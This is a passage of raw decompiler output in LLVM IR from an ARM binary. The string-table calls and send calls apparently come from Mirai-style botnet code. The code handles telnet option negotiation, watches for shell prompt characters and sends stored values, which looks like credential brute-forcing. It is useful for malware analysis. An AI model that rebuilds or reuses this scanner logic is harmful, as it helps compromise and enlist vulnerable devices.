  %v2_f0e0 = add i32 %v1_f0e0, 12
  %v3_f0e0 = inttoptr i32 %v2_f0e0 to i32*
  store i32 0, i32* %v3_f0e0, align 4
  %v0_f0e4 = load i32, i32* @r3, align 4
  %v1_f0e4 = trunc i32 %v0_f0e4 to i8
  %v2_f0e4 = load i32, i32* @r6, align 4
  %v3_f0e4 = add i32 %v2_f0e4, 284
  %v4_f0e4 = inttoptr i32 %v3_f0e4 to i8*
  store i8 %v1_f0e4, i8* %v4_f0e4, align 1
  br label %dec_label_pc_f0e8

dec_label_pc_f0e8:                                ; preds = %dec_label_pc_fa54, %dec_label_pc_f0dc
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f0ec

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_f768, %dec_label_pc_f628, %dec_label_pc_f4dc, %dec_label_pc_f408, %dec_label_pc_f264, %dec_label_pc_f190, %dec_label_pc_f0e8
  %v0_f0ec = load i32, i32* @r6, align 4
  %v1_f0ec = add i32 %v0_f0ec, 24
  %v2_f0ec = inttoptr i32 %v1_f0ec to i32*
  %v3_f0ec = load i32, i32* %v2_f0ec, align 4
  %v0_f0f0 = load i32, i32* @r7, align 4
  %v2_f0f0 = sub i32 %v0_f0f0, %v3_f0ec
  %v3_f0f0 = icmp uge i32 %v0_f0f0, %v3_f0ec
  store i1 %v3_f0f0, i1* %cpsr_c.global-to-local, align 1
  %v4_f0f0 = xor i32 %v0_f0f0, %v3_f0ec
  %v5_f0f0 = xor i32 %v2_f0f0, %v0_f0f0
  %v6_f0f0 = and i32 %v5_f0f0, %v4_f0f0
  %v7_f0f0 = icmp slt i32 %v6_f0f0, 0
  %v8_f0f0 = icmp slt i32 %v2_f0f0, 0
  %v9_f0f0 = icmp eq i32 %v0_f0f0, %v3_f0ec
  store i1 %v9_f0f0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0f4 = xor i1 %v8_f0f0, %v7_f0f0
  %v0_f0f0.v3_f0ec = select i1 %v2_f0f4, i32 %v0_f0f0, i32 %v3_f0ec
  store i32 %v0_f0f0.v3_f0ec, i32* %r1.global-to-local, align 4
  %v2_f0fc = sub i32 %v3_f0ec, %v0_f0f0.v3_f0ec
  store i32 %v2_f0fc, i32* @r2, align 4
  store i32 %v2_f0fc, i32* %v2_f0ec, align 4
  %v0_f104 = load i32, i32* @sb, align 4
  %v1_f104 = load i32, i32* %r1.global-to-local, align 4
  %v2_f104 = add i32 %v1_f104, %v0_f104
  store i32 %v2_f104, i32* @r1, align 4
  store i32 %v0_f104, i32* @r0, align 4
  %v3_f10c = call i32 @memmove(i32 %v0_f104, i32 %v2_f104, i32 %v2_f0fc)
  store i32 %v3_f10c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_efd0

dec_label_pc_f114:                                ; preds = %dec_label_pc_efd0
  %v1_f114 = add i32 %v0_efd0, 24
  %v2_f114 = inttoptr i32 %v1_f114 to i32*
  %v3_f114 = load i32, i32* %v2_f114, align 4
  store i32 %v3_f114, i32* %r2.global-to-local, align 4
  %v1_f118 = add i32 %v3_f114, -1
  store i32 %v1_f118, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f11c = icmp eq i32 %v1_f118, 0
  store i1 %v2_f11c, i1* %cpsr_z.global-to-local, align 1
  %tmp427 = icmp slt i32 %v1_f118, 1
  br i1 %tmp427, label %dec_label_pc_ef54.backedge.thread, label %dec_label_pc_f124

dec_label_pc_f124:                                ; preds = %dec_label_pc_f114
  %v2_f124 = add i32 %v1_f118, %v0_efd0
  store i32 %v2_f124, i32* %r3.global-to-local, align 4
  %v1_f128 = add i32 %v2_f124, 28
  %v2_f128 = inttoptr i32 %v1_f128 to i8*
  %v3_f128 = load i8, i8* %v2_f128, align 1
  %v4_f128 = zext i8 %v3_f128 to i32
  store i32 %v4_f128, i32* %r3.global-to-local, align 4
  %v2_f12c = icmp ugt i8 %v3_f128, 61
  store i1 %v2_f12c, i1* %cpsr_c.global-to-local, align 1
  %v7_f12c = icmp eq i8 %v3_f128, 62
  store i1 %v7_f12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f12c, label %dec_label_pc_f190, label %bb428

bb428:                                            ; preds = %dec_label_pc_f124
  %v3_f130 = icmp ugt i8 %v3_f128, 57
  store i1 %v3_f130, i1* %cpsr_c.global-to-local, align 1
  %v8_f130 = icmp eq i8 %v3_f128, 58
  store i1 %v8_f130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f130, label %dec_label_pc_f190, label %dec_label_pc_f138

dec_label_pc_f138:                                ; preds = %bb428
  %v2_f138 = icmp ugt i8 %v3_f128, 35
  store i1 %v2_f138, i1* %cpsr_c.global-to-local, align 1
  %v7_f138 = icmp eq i8 %v3_f128, 36
  store i1 %v7_f138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f138, label %dec_label_pc_f190, label %dec_label_pc_f140

dec_label_pc_f140:                                ; preds = %dec_label_pc_f138
  %v2_f140 = icmp ugt i8 %v3_f128, 34
  store i1 %v2_f140, i1* %cpsr_c.global-to-local, align 1
  %v7_f140 = icmp eq i8 %v3_f128, 35
  store i1 %v7_f140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f140, label %dec_label_pc_f190, label %dec_label_pc_f148

dec_label_pc_f148:                                ; preds = %dec_label_pc_f140
  %v2_f148 = icmp ugt i8 %v3_f128, 36
  store i1 %v2_f148, i1* %cpsr_c.global-to-local, align 1
  %v7_f148 = icmp eq i8 %v3_f128, 37
  store i1 %v7_f148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f148, label %dec_label_pc_f190, label %dec_label_pc_f178.preheader

dec_label_pc_f178.preheader:                      ; preds = %dec_label_pc_f148
  %v3_f14c = add i32 %v0_efd0, 28
  %v2_f150 = add i32 %v3_f14c, %v3_f114
  store i32 %v2_f150, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f178

dec_label_pc_f15c:                                ; preds = %bb429
  %v2_f15c = icmp ugt i8 %v3_f180, 35
  store i1 %v2_f15c, i1* %cpsr_c.global-to-local, align 1
  %v7_f15c = icmp eq i8 %v3_f180, 36
  store i1 %v7_f15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f15c, label %dec_label_pc_f190, label %dec_label_pc_f164

dec_label_pc_f164:                                ; preds = %dec_label_pc_f15c
  %v2_f164 = icmp ugt i8 %v3_f180, 34
  store i1 %v2_f164, i1* %cpsr_c.global-to-local, align 1
  %v7_f164 = icmp eq i8 %v3_f180, 35
  store i1 %v7_f164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f164, label %dec_label_pc_f190, label %dec_label_pc_f16c

dec_label_pc_f16c:                                ; preds = %dec_label_pc_f164
  %v2_f16c = icmp ugt i8 %v3_f180, 36
  store i1 %v2_f16c, i1* %cpsr_c.global-to-local, align 1
  %v7_f16c = icmp eq i8 %v3_f180, 37
  store i1 %v7_f16c, i1* %cpsr_z.global-to-local, align 1
  %v1_f170 = add i32 %v0_f170, -1
  store i32 %v1_f170, i32* %r3.global-to-local, align 4
  br i1 %v7_f16c, label %dec_label_pc_f190, label %dec_label_pc_f178

dec_label_pc_f178:                                ; preds = %dec_label_pc_f178.preheader, %dec_label_pc_f16c
  %v0_f170 = phi i32 [ %v2_f150, %dec_label_pc_f178.preheader ], [ %v1_f170, %dec_label_pc_f16c ]
  %v0_f178 = phi i32 [ %v1_f118, %dec_label_pc_f178.preheader ], [ %v1_f178, %dec_label_pc_f16c ]
  %v1_f178 = add i32 %v0_f178, -1
  store i32 %v1_f178, i32* %r1.global-to-local, align 4
  %v2_f178 = icmp ne i32 %v0_f178, 0
  store i1 %v2_f178, i1* %cpsr_c.global-to-local, align 1
  %v7_f178 = icmp eq i32 %v0_f178, 1
  store i1 %v7_f178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f178, label %dec_label_pc_ef54.backedge.thread561, label %dec_label_pc_f180

dec_label_pc_f180:                                ; preds = %dec_label_pc_f178
  %v1_f180 = add i32 %v0_f170, -2
  %v2_f180 = inttoptr i32 %v1_f180 to i8*
  %v3_f180 = load i8, i8* %v2_f180, align 1
  %v4_f180 = zext i8 %v3_f180 to i32
  store i32 %v4_f180, i32* %r2.global-to-local, align 4
  %v2_f184 = icmp ugt i8 %v3_f180, 61
  store i1 %v2_f184, i1* %cpsr_c.global-to-local, align 1
  %v7_f184 = icmp eq i8 %v3_f180, 62
  store i1 %v7_f184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f184, label %dec_label_pc_f190, label %bb429

bb429:                                            ; preds = %dec_label_pc_f180
  %v3_f188 = icmp ugt i8 %v3_f180, 57
  store i1 %v3_f188, i1* %cpsr_c.global-to-local, align 1
  %v8_f188 = icmp eq i8 %v3_f180, 58
  store i1 %v8_f188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f188, label %dec_label_pc_f190, label %dec_label_pc_f15c

dec_label_pc_f190:                                ; preds = %dec_label_pc_f180, %bb429, %dec_label_pc_f16c, %dec_label_pc_f164, %dec_label_pc_f15c, %dec_label_pc_f148, %dec_label_pc_f124, %dec_label_pc_f140, %dec_label_pc_f138, %bb428
  %v0_f194 = phi i32 [ %v1_f118, %dec_label_pc_f148 ], [ %v1_f118, %dec_label_pc_f124 ], [ %v1_f118, %dec_label_pc_f140 ], [ %v1_f118, %dec_label_pc_f138 ], [ %v1_f118, %bb428 ], [ %v1_f178, %dec_label_pc_f15c ], [ %v1_f178, %dec_label_pc_f164 ], [ %v1_f178, %dec_label_pc_f16c ], [ %v1_f178, %bb429 ], [ %v1_f178, %dec_label_pc_f180 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f194 = add i32 %v0_f194, 1
  store i32 %v1_f194, i32* @r7, align 4
  %v1_f198 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_f1a8 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_f1a8, i32* %r0.global-to-local, align 4
  %v3_f1ac = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f1ac, i32* %r2.global-to-local, align 4
  store i32 %v3_f1a8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f1b8 = load i32, i32* @r6, align 4
  %v1_f1b8 = add i32 %v0_f1b8, 4
  %v2_f1b8 = inttoptr i32 %v1_f1b8 to i32*
  %v3_f1b8 = load i32, i32* %v2_f1b8, align 4
  store i32 %v3_f1b8, i32* %r0.global-to-local, align 4
  %v4_f1bc = call i32 @__libc_send(i32 %v3_f1b8, i32 %v3_f1a8, i32 %v3_f1ac, i32 16384)
  store i32 %v4_f1bc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f1cc = load i32, i32* @r6, align 4
  %v1_f1cc = add i32 %v0_f1cc, 4
  %v2_f1cc = inttoptr i32 %v1_f1cc to i32*
  %v3_f1cc = load i32, i32* %v2_f1cc, align 4
  store i32 %v3_f1cc, i32* %r0.global-to-local, align 4
  %v4_f1d0 = call i32 @__libc_send(i32 %v3_f1cc, i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f1d8 = call i32 @table_lock_val(i32 8)
  store i32 %v1_f1d8, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_f1e0 = load i32, i32* @r6, align 4
  %v2_f1e0 = add i32 %v1_f1e0, 12
  %v3_f1e0 = inttoptr i32 %v2_f1e0 to i32*
  store i32 10, i32* %v3_f1e0, align 4
  br label %dec_label_pc_f0ec

dec_label_pc_f1e8:                                ; preds = %dec_label_pc_efd0
  %v1_f1e8 = add i32 %v0_efd0, 24
  %v2_f1e8 = inttoptr i32 %v1_f1e8 to i32*
  %v3_f1e8 = load i32, i32* %v2_f1e8, align 4
  store i32 %v3_f1e8, i32* %r2.global-to-local, align 4
  %v1_f1ec = add i32 %v3_f1e8, -1
  store i32 %v1_f1ec, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1f0 = icmp eq i32 %v1_f1ec, 0
  store i1 %v2_f1f0, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp slt i32 %v1_f1ec, 1
  br i1 %tmp430, label %dec_label_pc_ef54.backedge.thread, label %dec_label_pc_f1f8

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_f1e8
  %v2_f1f8 = add i32 %v1_f1ec, %v0_efd0
  store i32 %v2_f1f8, i32* %r3.global-to-local, align 4
  %v1_f1fc = add i32 %v2_f1f8, 28
  %v2_f1fc = inttoptr i32 %v1_f1fc to i8*
  %v3_f1fc = load i8, i8* %v2_f1fc, align 1
  %v4_f1fc = zext i8 %v3_f1fc to i32
  store i32 %v4_f1fc, i32* %r3.global-to-local, align 4
  %v2_f200 = icmp ugt i8 %v3_f1fc, 61
  store i1 %v2_f200, i1* %cpsr_c.global-to-local, align 1
  %v7_f200 = icmp eq i8 %v3_f1fc, 62
  store i1 %v7_f200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f200, label %dec_label_pc_f264, label %bb431

bb431:                                            ; preds = %dec_label_pc_f1f8
  %v3_f204 = icmp ugt i8 %v3_f1fc, 57
  store i1 %v3_f204, i1* %cpsr_c.global-to-local, align 1
  %v8_f204 = icmp eq i8 %v3_f1fc, 58
  store i1 %v8_f204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f204, label %dec_label_pc_f264, label %dec_label_pc_f20c

dec_label_pc_f20c:                                ; preds = %bb431
  %v2_f20c = icmp ugt i8 %v3_f1fc, 35
  store i1 %v2_f20c, i1* %cpsr_c.global-to-local, align 1
  %v7_f20c = icmp eq i8 %v3_f1fc, 36
  store i1 %v7_f20c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f20c, label %dec_label_pc_f264, label %dec_label_pc_f214

dec_label_pc_f214:                                ; preds = %dec_label_pc_f20c
  %v2_f214 = icmp ugt i8 %v3_f1fc, 34
  store i1 %v2_f214, i1* %cpsr_c.global-to-local, align 1
  %v7_f214 = icmp eq i8 %v3_f1fc, 35
  store i1 %v7_f214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f214, label %dec_label_pc_f264, label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f214
  %v2_f21c = icmp ugt i8 %v3_f1fc, 36
  store i1 %v2_f21c, i1* %cpsr_c.global-to-local, align 1
  %v7_f21c = icmp eq i8 %v3_f1fc, 37
  store i1 %v7_f21c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f21c, label %dec_label_pc_f264, label %dec_label_pc_f24c.preheader

dec_label_pc_f24c.preheader:                      ; preds = %dec_label_pc_f21c
  %v3_f220 = add i32 %v0_efd0, 28
  %v2_f224 = add i32 %v3_f220, %v3_f1e8
  store i32 %v2_f224, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f24c

dec_label_pc_f230:                                ; preds = %bb432
  %v2_f230 = icmp ugt i8 %v3_f254, 35
  store i1 %v2_f230, i1* %cpsr_c.global-to-local, align 1
  %v7_f230 = icmp eq i8 %v3_f254, 36
  store i1 %v7_f230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f230, label %dec_label_pc_f264, label %dec_label_pc_f238

dec_label_pc_f238:                                ; preds = %dec_label_pc_f230
  %v2_f238 = icmp ugt i8 %v3_f254, 34
  store i1 %v2_f238, i1* %cpsr_c.global-to-local, align 1
  %v7_f238 = icmp eq i8 %v3_f254, 35
  store i1 %v7_f238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f238, label %dec_label_pc_f264, label %dec_label_pc_f240

dec_label_pc_f240:                                ; preds = %dec_label_pc_f238
  %v2_f240 = icmp ugt i8 %v3_f254, 36
  store i1 %v2_f240, i1* %cpsr_c.global-to-local, align 1
  %v7_f240 = icmp eq i8 %v3_f254, 37
  store i1 %v7_f240, i1* %cpsr_z.global-to-local, align 1
  %v1_f244 = add i32 %v0_f244, -1
  store i32 %v1_f244, i32* %r3.global-to-local, align 4
  br i1 %v7_f240, label %dec_label_pc_f264, label %dec_label_pc_f24c

dec_label_pc_f24c:                                ; preds = %dec_label_pc_f24c.preheader, %dec_label_pc_f240
  %v0_f244 = phi i32 [ %v2_f224, %dec_label_pc_f24c.preheader ], [ %v1_f244, %dec_label_pc_f240 ]
  %v0_f24c = phi i32 [ %v1_f1ec, %dec_label_pc_f24c.preheader ], [ %v1_f24c, %dec_label_pc_f240 ]
  %v1_f24c = add i32 %v0_f24c, -1
  store i32 %v1_f24c, i32* %r1.global-to-local, align 4
  %v2_f24c = icmp ne i32 %v0_f24c, 0
  store i1 %v2_f24c, i1* %cpsr_c.global-to-local, align 1
  %v7_f24c = icmp eq i32 %v0_f24c, 1
  store i1 %v7_f24c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f24c, label %dec_label_pc_ef54.backedge.thread561, label %dec_label_pc_f254

dec_label_pc_f254:                                ; preds = %dec_label_pc_f24c
  %v1_f254 = add i32 %v0_f244, -2
  %v2_f254 = inttoptr i32 %v1_f254 to i8*
  %v3_f254 = load i8, i8* %v2_f254, align 1
  %v4_f254 = zext i8 %v3_f254 to i32
  store i32 %v4_f254, i32* %r2.global-to-local, align 4
  %v2_f258 = icmp ugt i8 %v3_f254, 61
  store i1 %v2_f258, i1* %cpsr_c.global-to-local, align 1
  %v7_f258 = icmp eq i8 %v3_f254, 62
  store i1 %v7_f258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f258, label %dec_label_pc_f264, label %bb432

bb432:                                            ; preds = %dec_label_pc_f254
  %v3_f25c = icmp ugt i8 %v3_f254, 57
  store i1 %v3_f25c, i1* %cpsr_c.global-to-local, align 1
  %v8_f25c = icmp eq i8 %v3_f254, 58
  store i1 %v8_f25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f25c, label %dec_label_pc_f264, label %dec_label_pc_f230

dec_label_pc_f264:                                ; preds = %dec_label_pc_f254, %bb432, %dec_label_pc_f240, %dec_label_pc_f238, %dec_label_pc_f230, %dec_label_pc_f21c, %dec_label_pc_f1f8, %dec_label_pc_f214, %dec_label_pc_f20c, %bb431
  %v0_f268 = phi i32 [ %v1_f1ec, %dec_label_pc_f21c ], [ %v1_f1ec, %dec_label_pc_f1f8 ], [ %v1_f1ec, %dec_label_pc_f214 ], [ %v1_f1ec, %dec_label_pc_f20c ], [ %v1_f1ec, %bb431 ], [ %v1_f24c, %dec_label_pc_f230 ], [ %v1_f24c, %dec_label_pc_f238 ], [ %v1_f24c, %dec_label_pc_f240 ], [ %v1_f24c, %bb432 ], [ %v1_f24c, %dec_label_pc_f254 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f268 = add i32 %v0_f268, 1
  store i32 %v1_f268, i32* @r7, align 4
  %v1_f26c = call i32 @table_unlock_val(i32 7)
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_f27c = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_f27c, i32* %r0.global-to-local, align 4
  %v3_f280 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f280, i32* %r2.global-to-local, align 4
  store i32 %v3_f27c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f28c = load i32, i32* @r6, align 4
  %v1_f28c = add i32 %v0_f28c, 4
  %v2_f28c = inttoptr i32 %v1_f28c to i32*
  %v3_f28c = load i32, i32* %v2_f28c, align 4
  store i32 %v3_f28c, i32* %r0.global-to-local, align 4
  %v4_f290 = call i32 @__libc_send(i32 %v3_f28c, i32 %v3_f27c, i32 %v3_f280, i32 16384)
  store i32 %v4_f290, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f2a0 = load i32, i32* @r6, align 4
  %v1_f2a0 = add i32 %v0_f2a0, 4
  %v2_f2a0 = inttoptr i32 %v1_f2a0 to i32*
  %v3_f2a0 = load i32, i32* %v2_f2a0, align 4
  store i32 %v3_f2a0, i32* %r0.global-to-local, align 4
  %v4_f2a4 = call i32 @__libc_send(i32 %v3_f2a0, i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f2ac = call i32 @table_lock_val(i32 7)
  store i32 %v1_f2ac, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_f2b4 = load i32, i32* @r6, align 4
  %v2_f2b4 = add i32 %v1_f2b4, 12
  %v3_f2b4 = inttoptr i32 %v2_f2b4 to i32*
  store i32 9, i32* %v3_f2b4, align 4
  br label %dec_label_pc_f0ec

dec_label_pc_f2bc:                                ; preds = %dec_label_pc_efd0
  %v1_f2bc = add i32 %v0_efd0, 24
  %v2_f2bc = inttoptr i32 %v1_f2bc to i32*
  %v3_f2bc = load i32, i32* %v2_f2bc, align 4
  store i32 %v3_f2bc, i32* %r1.global-to-local, align 4
  %v0_f2c0 = load i32, i32* @sb, align 4
  store i32 %v0_f2c0, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_f2c8166 = icmp eq i32 %v3_f2bc, 0
  store i1 %v3_f2c8166, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f2c8166, i1* %cpsr_z.global-to-local, align 1
  %v6_f2cc173 = icmp sgt i32 %v3_f2bc, 0
  br i1 %v6_f2cc173, label %dec_label_pc_f2d0.preheader, label %dec_label_pc_f37c

dec_label_pc_f2c8.loopexit:                       ; preds = %dec_label_pc_f2ec
  %v2_f2f4 = add i32 %v1_f2f4, 2
  store i32 %v2_f2f4, i32* @r4, align 4
  %v2_f2f8 = add i32 %v1_f2f8, 2
  store i32 %v2_f2f8, i32* @r7, align 4
  %v3_f2c8 = icmp uge i32 %v2_f2f8, %v1_f2c8
  store i1 %v3_f2c8, i1* %cpsr_c.global-to-local, align 1
  %v9_f2c8 = icmp eq i32 %v2_f2f8, %v1_f2c8
  store i1 %v9_f2c8, i1* %cpsr_z.global-to-local, align 1
  %v6_f2cc = icmp slt i32 %v2_f2f8, %v1_f2c8
  br i1 %v6_f2cc, label %dec_label_pc_f2d0.preheader, label %dec_label_pc_f37c

dec_label_pc_f2d0.preheader:                      ; preds = %dec_label_pc_f2bc, %dec_label_pc_f2c8.loopexit
  %v6_f384273 = phi i32 [ %v6_f384274, %dec_label_pc_f2c8.loopexit ], [ %v0_efd0, %dec_label_pc_f2bc ]
  %v1_f2f8262 = phi i32 [ %v2_f2f8, %dec_label_pc_f2c8.loopexit ], [ 0, %dec_label_pc_f2bc ]
  %v1_f2dc260 = phi i32 [ %v1_f2c8, %dec_label_pc_f2c8.loopexit ], [ %v3_f2bc, %dec_label_pc_f2bc ]
  %v0_f2d0258 = phi i32 [ %v2_f2f4, %dec_label_pc_f2c8.loopexit ], [ %v0_f2c0, %dec_label_pc_f2bc ]
  br label %dec_label_pc_f2d0

dec_label_pc_f2d0:                                ; preds = %dec_label_pc_f2d0.preheader, %dec_label_pc_f360
  %v6_f384274 = phi i32 [ %v6_f384273, %dec_label_pc_f2d0.preheader ], [ %v0_f368, %dec_label_pc_f360 ]
  %v1_f2f8 = phi i32 [ %v1_f2f8262, %dec_label_pc_f2d0.preheader ], [ %v1_f36c, %dec_label_pc_f360 ]
  %v1_f2c8 = phi i32 [ %v1_f2dc260, %dec_label_pc_f2d0.preheader ], [ %v3_f368, %dec_label_pc_f360 ]
  %v1_f2f4 = phi i32 [ %v0_f2d0258, %dec_label_pc_f2d0.preheader ], [ %v1_f374, %dec_label_pc_f360 ]
  %v1_f2d0 = inttoptr i32 %v1_f2f4 to i8*
  %v2_f2d0 = load i8, i8* %v1_f2d0, align 1
  %v3_f2d0 = zext i8 %v2_f2d0 to i32
  store i32 %v3_f2d0, i32* @r3, align 4
  %v2_f2d4 = icmp eq i8 %v2_f2d0, -1
  store i1 %v2_f2d4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f2d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2d4, label %dec_label_pc_f2dc, label %dec_label_pc_f37c

dec_label_pc_f2dc:                                ; preds = %dec_label_pc_f2d0
  %v0_f2dc = load i32, i32* @sb, align 4
  %v2_f2dc = add i32 %v0_f2dc, %v1_f2c8
  store i32 %v2_f2dc, i32* %r2.global-to-local, align 4
  %v1_f2e0 = add i32 %v1_f2f4, 1
  store i32 %v1_f2e0, i32* @r5, align 4
  %v3_f2e4 = icmp uge i32 %v2_f2dc, %v1_f2e0
  store i1 %v3_f2e4, i1* %cpsr_c.global-to-local, align 1
  %v9_f2e4 = icmp eq i32 %v2_f2dc, %v1_f2e0
  store i1 %v9_f2e4, i1* %cpsr_z.global-to-local, align 1
  %v2_f2e8 = xor i1 %v3_f2e4, true
  %v3_f2e8 = or i1 %v9_f2e4, %v2_f2e8
  br i1 %v3_f2e8, label %dec_label_pc_f37c, label %dec_label_pc_f2ec

dec_label_pc_f2ec:                                ; preds = %dec_label_pc_f2dc
  %v2_f2ec = inttoptr i32 %v1_f2e0 to i8*
  %v3_f2ec = load i8, i8* %v2_f2ec, align 1
  %v4_f2ec = zext i8 %v3_f2ec to i32
  store i32 %v4_f2ec, i32* @r3, align 4
  %v2_f2f0 = icmp eq i8 %v3_f2ec, -1
  store i1 %v2_f2f0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f2f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2f0, label %dec_label_pc_f2c8.loopexit, label %dec_label_pc_f300

dec_label_pc_f300:                                ; preds = %dec_label_pc_f2ec
  %v2_f300 = icmp ugt i8 %v3_f2ec, -4
  store i1 %v2_f300, i1* %cpsr_c.global-to-local, align 1
  %v7_f300 = icmp eq i8 %v3_f2ec, -3
  store i1 %v7_f300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f300, label %dec_label_pc_f894, label %dec_label_pc_f308

dec_label_pc_f308:                                ; preds = %dec_label_pc_f300
  %v1_f308 = add i32 %v1_f2f4, 2
  store i32 %v1_f308, i32* @r3, align 4
  %v3_f30c = icmp uge i32 %v2_f2dc, %v1_f308
  store i1 %v3_f30c, i1* %cpsr_c.global-to-local, align 1
  %v9_f30c = icmp eq i32 %v2_f2dc, %v1_f308
  store i1 %v9_f30c, i1* %cpsr_z.global-to-local, align 1
  %v2_f310 = xor i1 %v3_f30c, true
  %v3_f310 = or i1 %v9_f30c, %v2_f310
  br i1 %v3_f310, label %dec_label_pc_f37c, label %dec_label_pc_f314

dec_label_pc_f314:                                ; preds = %dec_label_pc_f8f8, %bb454, %.thread138, %dec_label_pc_f308
  %v0_f314 = load i32, i32* @r5, align 4
  %v1_f314 = inttoptr i32 %v0_f314 to i8*
  %v2_f314 = load i8, i8* %v1_f314, align 1
  %v3_f314 = zext i8 %v2_f314 to i32
  store i32 %v3_f314, i32* %r3.global-to-local, align 4
  %v2_f318 = icmp ugt i8 %v2_f314, -4
  store i1 %v2_f318, i1* %cpsr_c.global-to-local, align 1
  %v7_f318 = icmp eq i8 %v2_f314, -3
  store i1 %v7_f318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f318, label %.thread96, label %dec_label_pc_f328

.thread96:                                        ; preds = %dec_label_pc_f314
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f314, align 1
  %v0_f324.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f324.pr.pr, label %.thread99, label %.thread96.dec_label_pc_f328thread-pre-split_crit_edge

.thread96.dec_label_pc_f328thread-pre-split_crit_edge: ; preds = %.thread96
  %v0_f328.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f328

dec_label_pc_f328:                                ; preds = %dec_label_pc_f314, %.thread96.dec_label_pc_f328thread-pre-split_crit_edge
  %v0_f328.pr = phi i32 [ %v0_f328.pr.pre, %.thread96.dec_label_pc_f328thread-pre-split_crit_edge ], [ %v3_f314, %dec_label_pc_f314 ]
  %v2_f328 = icmp ugt i32 %v0_f328.pr, 250
  store i1 %v2_f328, i1* %cpsr_c.global-to-local, align 1
  %v7_f328 = icmp eq i32 %v0_f328.pr, 251
  store i1 %v7_f328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f328, label %bb433, label %.thread99

bb433:                                            ; preds = %dec_label_pc_f328
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f330 = load i32, i32* @r5, align 4
  %v4_f330 = inttoptr i32 %v3_f330 to i8*
  store i8 -3, i8* %v4_f330, align 1
  br label %.thread99

.thread99:                                        ; preds = %dec_label_pc_f328, %.thread96, %bb433
  %v0_f334 = load i32, i32* @r4, align 4
  %v1_f334 = add i32 %v0_f334, 2
  %v2_f334 = inttoptr i32 %v1_f334 to i8*
  %v3_f334 = load i8, i8* %v2_f334, align 1
  %v4_f334 = zext i8 %v3_f334 to i32
  store i32 %v4_f334, i32* %r3.global-to-local, align 4
  %v2_f338 = icmp ugt i8 %v3_f334, -4
  store i1 %v2_f338, i1* %cpsr_c.global-to-local, align 1
  %v7_f338 = icmp eq i8 %v3_f334, -3
  store i1 %v7_f338, i1* %cpsr_z.global-to-local, align 1
